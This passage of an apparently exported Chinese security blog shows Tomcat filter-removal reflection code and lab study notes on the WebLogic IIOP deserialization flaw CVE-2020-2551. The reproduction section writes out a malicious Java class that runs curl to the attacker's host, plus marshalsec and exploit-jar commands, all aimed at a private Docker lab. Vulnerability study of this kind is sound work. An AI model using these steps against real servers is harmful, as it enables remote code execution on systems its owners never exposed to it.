<h2 id="动态删除filter"><a href="#动态删除filter" class="headerlink" title="动态删除filter"></a>动态删除filter</h2><p>每次访问某个页面都会创建一次filter，实际filter的创建是在org.apache.catalina.core.StandardWrapperValve#invoke中的ApplicationFilterFactory.createFilterChain</p>
<p><img src="/Tomcat-%E8%BF%90%E8%A1%8C%E6%97%B6%E5%8A%A8%E6%80%81%E6%B7%BB%E5%8A%A0%E5%88%A0%E9%99%A4filter/image-20200528091439128.png" alt="image-20200528091439128"></p>
<p>下断点跟入调试跟入ApplicationFilterFactory.createFilterChain</p>
<p><img src="/Tomcat-%E8%BF%90%E8%A1%8C%E6%97%B6%E5%8A%A8%E6%80%81%E6%B7%BB%E5%8A%A0%E5%88%A0%E9%99%A4filter/image-20200528091801575.png" alt="image-20200528091801575"></p>
<p>从context提取了FilterMaps数组，并且遍历添加到filterChain，最终生效</p>
<p>所以动态删除的话只要从FilterMaps中删除就可</p>
<p>ps.后来测试发现也需要从FilterDefs中删除，否则用servletContext.getFilterRegistration判断filter的话还是会返回存在</p>
<p>完整代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">dynamicRemoveFilter</span><span class="params">(String name,javax.servlet.http.HttpServletRequest request)</span>&#123;</span><br><span class="line">    javax.servlet.ServletContext servletContext=request.getServletContext();</span><br><span class="line">    <span class="keyword">if</span> (servletContext.getFilterRegistration(name) != <span class="literal">null</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//因为门面模式的使用，此处servletContext实际是ApplicationContextFacade，需要提取ApplicationContext</span></span><br><span class="line">            java.lang.reflect.Field contextField=servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            contextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            org.apache.catalina.core.<span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (org.apache.catalina.core.ApplicationContext) contextField.get(servletContext);</span><br><span class="line">            <span class="comment">//获取ApplicationContext中的StandardContext</span></span><br><span class="line">            contextField=applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            contextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            org.apache.catalina.core.StandardContext standardContext= (org.apache.catalina.core.StandardContext) contextField.get(applicationContext);</span><br><span class="line">            <span class="comment">//获取FilterMaps</span></span><br><span class="line">            java.lang.reflect.<span class="type">Method</span> <span class="variable">findFilterMapsMethod</span> <span class="operator">=</span> standardContext.getClass().getMethod(<span class="string">&quot;findFilterMaps&quot;</span>);</span><br><span class="line">            findFilterMapsMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            Object[] FilterMaps = (Object[]) findFilterMapsMethod.invoke(standardContext);</span><br><span class="line">            <span class="comment">//获取指定filtermap</span></span><br><span class="line">            <span class="comment">//兼容tomcat7,8</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">ccc</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                ccc = Class.forName(<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable t)&#123;&#125;</span><br><span class="line">            <span class="keyword">if</span> (ccc == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    ccc = Class.forName(<span class="string">&quot;org.apache.catalina.deploy.FilterMap&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Throwable t)&#123;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">filtermap</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; FilterMaps.length; i++) &#123;</span><br><span class="line">                <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> FilterMaps[i];</span><br><span class="line">                java.lang.reflect.<span class="type">Method</span> <span class="variable">getFilterNameMethod</span> <span class="operator">=</span> ccc.getMethod(<span class="string">&quot;getFilterName&quot;</span>);</span><br><span class="line">                getFilterNameMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="keyword">if</span>(getFilterNameMethod.invoke(FilterMaps[i]).equals(name))&#123;</span><br><span class="line">                    filtermap = FilterMaps[i];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//删除filtermap</span></span><br><span class="line">            java.lang.reflect.<span class="type">Method</span> <span class="variable">removeFilterMapMethod</span> <span class="operator">=</span> standardContext.getClass().getMethod(<span class="string">&quot;removeFilterMap&quot;</span>,ccc);</span><br><span class="line">            removeFilterMapMethod.invoke(standardContext,ccc.cast(filtermap));</span><br><span class="line"></span><br><span class="line">            <span class="comment">//也要从FilterDefs中删除，否则用servletContext.getFilterRegistration判断时还是会认为filter存在</span></span><br><span class="line">            java.lang.reflect.<span class="type">Method</span> <span class="variable">findFilterDefMethod</span> <span class="operator">=</span> standardContext.getClass().getMethod(<span class="string">&quot;findFilterDef&quot;</span>,String.class);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">filterDef</span> <span class="operator">=</span> findFilterDefMethod.invoke(standardContext,name);</span><br><span class="line">            <span class="type">Class</span> <span class="variable">ddd</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                ddd = Class.forName(<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable t)&#123;&#125;</span><br><span class="line">            <span class="keyword">if</span> (ddd == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    ddd = Class.forName(<span class="string">&quot;org.apache.catalina.deploy.FilterDef&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Throwable t)&#123;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">            java.lang.reflect.<span class="type">Method</span> <span class="variable">removeFilterDefMethod</span> <span class="operator">=</span> standardContext.getClass().getMethod(<span class="string">&quot;removeFilterDef&quot;</span>,ddd);</span><br><span class="line">            removeFilterDefMethod.invoke(standardContext,filterDef);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            ;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>Tomcat</tag>
      </tags>
  </entry>
  <entry>
    <title>Weblogic IIOP 反序列化漏洞学习笔记(CVE-2020-2551)</title>
    <url>/2020/04/22/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p>Weblogic IIOP协议默认开启，跟T3协议一起监听在7001端口，这次漏洞主要原因是错误的过滤JtaTransactionManager类，JtaTransactionManager父类AbstractPlatformTransactionManager在之前的补丁里面就加入到黑名单列表了，T3协议使用的是resolveClass方法去过滤，resolveClass方法是会读取父类的，所以T3协议这样过滤没问题。但是IIOP协议这块虽然也是使用的这个黑名单列表，但不是使用resolveClass方法去判断，默认只会判断本类的类名，而JtaTransactionManager类不在黑名单列表里面并且存在jndi注入</p>
<span id="more"></span>

<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="Corba概念"><a href="#Corba概念" class="headerlink" title="Corba概念"></a>Corba概念</h3><h4 id="CORBA"><a href="#CORBA" class="headerlink" title="CORBA"></a>CORBA</h4><p>公用对象请求代理体系结构（Common Object Request Broker Architecture），缩写为 CORBA，是对象管理组织（Object Management Group）制定的一种标准分布式对象结构</p>
<p>简言之，CORBA 允许应用程序和其他的应用程序通讯，而不论他们在什么地方或者由谁来设计</p>
<p>CORBA使用平台无关的语言IDL（interface definition language）描述连接到远程对象的接口，然后将其映射到制定的语言实现</p>
<p>CORBA曾经是分布式计算的主流技术，在电信等领域使用广泛。开发和部署成本较高，目前属于已经基本被遗弃的技术，被轻量级的Web服务、RESTful服务等代替了</p>
<p>一般来说CORBA将其结构分为三部分</p>
<ul>
<li>naming service</li>
<li>client side</li>
<li>servant side</li>
</ul>
<p>这三部分组成了CORBA结构的基础三元素，而通信过程也是在这三方间完成的。我们知道CORBA是一个基于网络的架构，所以以上三者可以被部署在不同的位置。</p>
<p><code>servant side</code> 可以理解为一个接收 <code>client side</code> 请求的服务端；</p>
<p><code>naming service</code> 对于 <code>servant side</code> 来说用于服务方注册其提供的服务，对于 <code>client side</code> 来说客户端将从 <code>naming service</code> 来获取服务方的信息</p>
<p>这个关系可以简单的理解成目录与章节具体内容的关系：目录即为 <code>naming service</code>，<code>servant side</code> 可以理解为具体的内容，内容需要首先在目录里面进行注册，这样当用户想要访问具体内容时只需要首先在目录中查找到具体内容所注册的引用（通常为页数），这样就可以利用这个引用快速的找到章节具体的内容</p>
<h4 id="ORB（Object-Request-Broker）"><a href="#ORB（Object-Request-Broker）" class="headerlink" title="ORB（Object Request Broker）"></a><strong>ORB</strong>（Object Request Broker）</h4><p>即对象请求代理，客户端可以很简单的通过这个媒介使用服务器对象的方法而不需要关注服务器对象是在同一台机器上还是通过远程网络调用的，ORB截获调用后负责找到一个对象以满足该请求</p>
<h4 id="IOR（Interoperable-Object-References）"><a href="#IOR（Interoperable-Object-References）" class="headerlink" title="IOR（Interoperable Object References）"></a>IOR（Interoperable Object References）</h4><p>IOR用于表示一个对象引用，我们知道，当我们在客户端一个CORBA对象的时候，接触的并不是真正的对象，而是这个对象的代理（Proxy），Proxy使用这个对象的位置信息与服务器通信。那么这里有一个问题，这些信息到底些什么信息，另外，ORB使用什么样子的形式去传输这些对象的信息。答案是IOR。这里给它加上Interoperable是因为IOR是ORB Interoperability Architecture的一部分</p>
<h4 id="GIOP（General-Inter-ORB-Protocol）与-IIOP-（Internet-Inter-ORB-Protocol）"><a href="#GIOP（General-Inter-ORB-Protocol）与-IIOP-（Internet-Inter-ORB-Protocol）" class="headerlink" title="GIOP（General Inter-ORB Protocol）与 IIOP （Internet Inter-ORB Protocol）"></a><strong>GIOP</strong>（General Inter-ORB Protocol）与 <strong>IIOP</strong> （Internet Inter-ORB Protocol）</h4><p>GIOP全称（General Inter-ORB Protocol）通用对象请求协议，其功能简单来说就是CORBA用来进行数据传输的协议</p>
<p>GIOP是一个抽象的协议，针对不同的通信层有不同的具体实现，而针对于TCP&#x2F;IP层，其实现名为IIOP（Internet Inter-ORB Protocol），定义了如何通过TCP&#x2F;IP协议交换GIOP消息，所以通常说CORBA是基于IIOP协议的</p>
<p>ORB之间进行通信是通过GIOP协议完成的。GIOP定义了ORB之间互操作的传输语法和标准消息格式，比如请求头、请求体所包含的字段和长度</p>
<h4 id="IDL"><a href="#IDL" class="headerlink" title="IDL"></a>IDL</h4><p>IDL全称接口定义语言，是用来描述软件组件接口的一种规范语言。用户可以定义模块、接口、属性、方法、输入输出参数，甚至异常等等，它完成了与各种编程语言无关的方式描述接口，从而实现了不同语言之间的通信，这样就保证了跨语言跨环境的远程对象调用</p>
<p>就如上文所说，IDL是与编程语言无关的一种规范化描述性语言，不同的编程语言为了将其转化成IDL，都制定了一套自用的编译器用于将可读取的OMG IDL文件转换或映射成相应的接口或类型</p>
<p>Java Standard Edition CORBA&#x2F;IIOP 实现被称为 Java IDL。 与 IDL 到 Java (idlj) 编译器一起，Java IDL 可用于定义、实现和访问 Java 编程语言中的 CORBA 对象</p>
<h3 id="通信流程"><a href="#通信流程" class="headerlink" title="通信流程"></a>通信流程</h3><ol>
<li><p>启动orbd作为naming service，会创建name service服务。</p>
<p>ORBD可以理解为ORB的守护进程，其主要负责建立客户端(client side)与服务端(servant side)的关系，同时负责查找指定的IOR(可互操作对象引用，是一种数据结构，是CORBA标准的一部分)。ORBD是由Java原生支持的一个服务，其在整个CORBA通信中充当着naming service的作用，所以客户端和服务端要使用ORB，都要指定ORBD的端口和地址</p>
</li>
<li><p>corba server向orbd发送请求获取name service，协商好通信格式</p>
</li>
<li><p>orbd返回保存的name service</p>
</li>
<li><p>corba server拿到name service后将具体的实现类绑定到name service上，这个时候orbd会拿到注册后的信息，这个信息就是IOR</p>
</li>
<li><p>corba client向orbd发起请求获取name service。</p>
</li>
<li><p>orbd返回保存的name service。</p>
</li>
<li><p>corba client在name service中查找已经注册的信息获取到“引用”的信息(corba server的地址等)，通过orb的连接功能将远程方法调用的请求转发到corba server。</p>
</li>
<li><p>corba server通过orb接收请求，并利用POA拦截请求，将请求中所指定的类封装好，同样通过orb的连接功能返回给corba client</p>
<p>Stub是client side调用orb的媒介，POA是servant side用于拦截client请求的媒介，而两者在结构上其实都是客户端&#x2F;服务端调用orb的媒介</p>
</li>
</ol>
<h3 id="RMI-IIOP"><a href="#RMI-IIOP" class="headerlink" title="RMI-IIOP"></a>RMI-IIOP</h3><p>RMI-IIOP出现以前，只有RMI和CORBA两种选择来进行分布式程序设计，二者之间不能协作。RMI-IIOP综合了RMI的简单性和CORBA的多语言兼容性，克服了RMI只能用于Java的缺点和CORBA的复杂性（可以不用掌握IDL），稍微修改代码即可实现RMI客户端使用IIOP协议操作服务端CORBA对象，使得程序员能更方便的编写分布式程序设计，实现分布式计算</p>
<p>在Weblogic中实现了RMI-IIOP模型</p>
<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200423103837351.png" alt="image-20200423103837351"></p>
<p>Weblogic的文档把这个实现叫做RMI over IIOP</p>
<h4 id="RMI-IIOP远程调用"><a href="#RMI-IIOP远程调用" class="headerlink" title="RMI-IIOP远程调用"></a>RMI-IIOP远程调用</h4><p>编写一个RMI IIOP远程调用步骤：</p>
<ol>
<li>定义远程接口类</li>
<li>编写实现类</li>
<li>编写服务端</li>
<li>编写客户端</li>
<li>编译代码并为服务端与客户端生成对应的使用类</li>
</ol>
<p>远程接口类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> rmi_iiop;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">HelloInterface</span> <span class="keyword">extends</span> <span class="title class_">java</span>.rmi.Remote &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sayHello</span><span class="params">()</span> <span class="keyword">throws</span> java.rmi.RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>实现类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> rmi_iiop;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.rmi.PortableRemoteObject;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloImpl</span> <span class="keyword">extends</span> <span class="title class_">PortableRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">HelloInterface</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">HelloImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sayHello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello !!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>服务端</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> rmi_iiop;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">JNDI_FACTORY</span> <span class="operator">=</span> <span class="string">&quot;com.sun.jndi.cosnaming.CNCtxFactory&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//实例化Hello servant</span></span><br><span class="line">            <span class="type">HelloImpl</span> <span class="variable">helloRef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HelloImpl</span>();</span><br><span class="line"></span><br><span class="line">            <span class="comment">//使用JNDI在命名服务中发布引用</span></span><br><span class="line">            <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> getInitialContext(<span class="string">&quot;iiop://127.0.0.1:1050&quot;</span>);</span><br><span class="line">            initialContext.rebind(<span class="string">&quot;HelloService&quot;</span>, helloRef);</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;Hello Server Ready...&quot;</span>);</span><br><span class="line"></span><br><span class="line">            Thread.currentThread().join();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">            ex.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> InitialContext <span class="title function_">getInitialContext</span><span class="params">(String url)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">env</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY, JNDI_FACTORY);</span><br><span class="line">        env.put(Context.PROVIDER_URL, url);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>(env);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>客户端</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> rmi_iiop;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.rmi.PortableRemoteObject;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">JNDI_FACTORY</span> <span class="operator">=</span> <span class="string">&quot;com.sun.jndi.cosnaming.CNCtxFactory&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> getInitialContext(<span class="string">&quot;iiop://127.0.0.1:1050&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//从命名服务获取引用</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">objRef</span> <span class="operator">=</span> initialContext.lookup(<span class="string">&quot;HelloService&quot;</span>);</span><br><span class="line">            <span class="comment">//narrow引用为具体的对象</span></span><br><span class="line">            <span class="type">HelloInterface</span> <span class="variable">hello</span> <span class="operator">=</span> (HelloInterface) PortableRemoteObject.narrow(objRef, HelloInterface.class);</span><br><span class="line"></span><br><span class="line">            hello.sayHello();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">            ex.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> InitialContext <span class="title function_">getInitialContext</span><span class="params">(String url)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">env</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY, JNDI_FACTORY);</span><br><span class="line">        env.put(Context.PROVIDER_URL, url);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>(env);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到客户端通过JNDI查找的方式获取到远程的Reference对象，然后调用执行该对象的方法</p>
<p>先编译好以上代码</p>
<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200421141257107.png" alt="image-20200421141257107"></p>
<p>然后生成服务端与客户端进行远程调用的代理类</p>
<p>（rmic为远程对象生成 stub 和 skeleton）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rmic -iiop rmi_iiop.HelloImpl</span><br></pre></td></tr></table></figure>

<p>执行完成后，在下面生成了两个类（Tie用于服务端，Stub用于客户端）</p>
<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200421141537149.png" alt="image-20200421141537149"></p>
<p>启动一个命名服务器，在本地监听1050端口</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">orbd -ORBInitialPort 1050 -ORBInitialHost loaclhost</span><br></pre></td></tr></table></figure>

<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200421141709648.png" alt="image-20200421141709648"></p>
<p>然后先后运行服务端及客户端</p>
<p>在服务端的控制台输出Hello !!，即完成了一次RMI IIOP远程调用</p>
<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200421141843980.png" alt="image-20200421141843980"></p>
<h2 id="Weblogic环境搭建"><a href="#Weblogic环境搭建" class="headerlink" title="Weblogic环境搭建"></a>Weblogic环境搭建</h2><p><a href="https://github.com/QAX-A-Team/WeblogicEnvironment">Weblogic环境搭建工具</a></p>
<p>下载需要的JDK和Weblogic Server，并构建镜像</p>
<p>（后来复现没成功，排错的时候把JDK换为了7u10，高版本JDK会限制RMI远程类的加载，但部分版本可用LDAP绕过，最后证实当时问题为编译恶意类的JDK版本高于了靶机JDK版本，所以测试时尽量用相同版本JDK）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker build --build-arg JDK_PKG=jdk-7u10-linux-x64.tar.gz --build-arg WEBLOGIC_JAR=wls1036_generic.jar  -t weblogic .</span><br></pre></td></tr></table></figure>

<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200420140722312.png" alt="image-20200420140722312"></p>
<p>运行容器</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d -p 7001:7001 -p 8453:8453 -p 5556:5556 --name weblogic weblogic</span><br></pre></td></tr></table></figure>

<p>将远程调试需要的目录从已运行的容器复制到本机并用idea打开</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">cp</span> weblogic:/u01/app/oracle/middleware/ ./middleware/</span><br></pre></td></tr></table></figure>



<p>设置Project中的SDK为对应版本</p>
<p>在libraries添加lib和modules两个目录</p>
<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200420152108993.png" alt="image-20200420152108993"></p>
<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200420152127502.png" alt="image-20200420152127502"></p>
<p>设置远程调试</p>
<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200420152247957.png" alt="image-20200420152247957"></p>
<p>由于我Weblogic环境搭建在Linux虚拟机的Docker中，这里host是虚拟机ip</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote>
<p>Windows宿主机ip：192.168.110.1</p>
<p>Linux虚拟机ip：192.168.110.3</p>
<p>Weblogic Docker ip：172.17.0.2</p>
</blockquote>
<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422181352532.png" alt="image-20200422181352532"></p>
<h3 id="Linux虚拟机中本地攻击Docker（成功）"><a href="#Linux虚拟机中本地攻击Docker（成功）" class="headerlink" title="Linux虚拟机中本地攻击Docker（成功）"></a>Linux虚拟机中本地攻击Docker（成功）</h3><p>编译恶意类，尽量使用和weblogic相同的版本编译</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Evil</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;curl http://192.168.110.3:8080/success&quot;</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200420165824498.png" alt="image-20200420165824498"></p>
<p>本地起一个web服务</p>
<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200420170115466.png" alt="image-20200420170115466"></p>
<p>使用<a href="https://github.com/mbechler/marshalsec">marshalsec</a>起一个RMI服务</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer <span class="string">&quot;http://192.168.110.3:8080/#Evil&quot;</span> 1099</span><br></pre></td></tr></table></figure>

<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200420170216981.png" alt="image-20200420170216981"></p>
<p>运行<a href="https://github.com/Y4er/CVE-2020-2551">weblogic_CVE_2020_2551.jar</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar weblogic_CVE_2020_2551.jar 192.168.110.3 7001 rmi://192.168.110.3:1099/xxx</span><br></pre></td></tr></table></figure>

<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200420170450094.png" alt="image-20200420170450094"></p>
<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200420170758175.png" alt="image-20200420170758175"></p>
<h3 id="宿主机攻击虚拟机中Docker（失败）"><a href="#宿主机攻击虚拟机中Docker（失败）" class="headerlink" title="宿主机攻击虚拟机中Docker（失败）"></a>宿主机攻击虚拟机中Docker（失败）</h3><p>RMI和WEB服务依旧在虚拟机中启动，在宿主机运行<a href="https://github.com/Y4er/CVE-2020-2551">weblogic_CVE_2020_2551.jar</a>攻击失败</p>
<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200420172040851.png" alt="image-20200420172040851"></p>
<p>RMI服务未收到请求</p>
<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200420172142185.png" alt="image-20200420172142185"></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>RMI-IIOP调用的过程和普通的RMI方法调用很相似，因此很容易想到RMI的反序列化漏洞（CVE-2017-3241），通过bind方法中发送序列化对象到服务端，服务端在读取的时候进行反序列化操作，从而触发漏洞</p>
<p>关键代码如下</p>
<p>JtaTransactionManager是spring爆出的一个可以JNDI注入的类，在weblogic中也存在。</p>
<p>weblogic.jndi.WLInitialContextFactory 是weblogic的JNDI工厂类</p>
<p>Gadgets为Ysoserial中的一个工具类</p>
